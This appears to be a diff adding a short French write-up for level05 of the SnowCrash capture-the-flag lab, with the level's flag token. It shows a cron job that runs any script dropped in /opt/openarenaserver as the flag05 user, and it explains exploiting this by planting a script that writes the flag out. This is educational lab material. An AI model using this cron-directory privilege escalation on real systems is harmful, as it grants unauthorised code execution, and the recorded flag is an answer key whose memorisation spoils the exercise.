@@ -1,0 +1,28 @@
+Temporary : 
+  - Flag : viuaaale9huek52boumoomioc
+
+Explications : 
+
+Lorsqu'on se connecte, on recoit un message "You have new mail"
+
+cat /var/spool/mail/level05
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+cat /usr/sbin/openarenaserver
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+On comprend donc que toutes les deuxiemes minutes (minutes paires) ce script est executer avec flag05.
+
+Donc on a juste a creer un fichier script.sh dans /opt/openarenaserver qui contient "getflag > /tmp/flag.txt"
+
+Au bout de la prochaine minute paire on aura le fichier script.sh qui s'est supprimer et /tmp/flag.txt s'est creer avec ce contenu : 
+
+level05@SnowCrash:~$ cat /tmp/flag.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
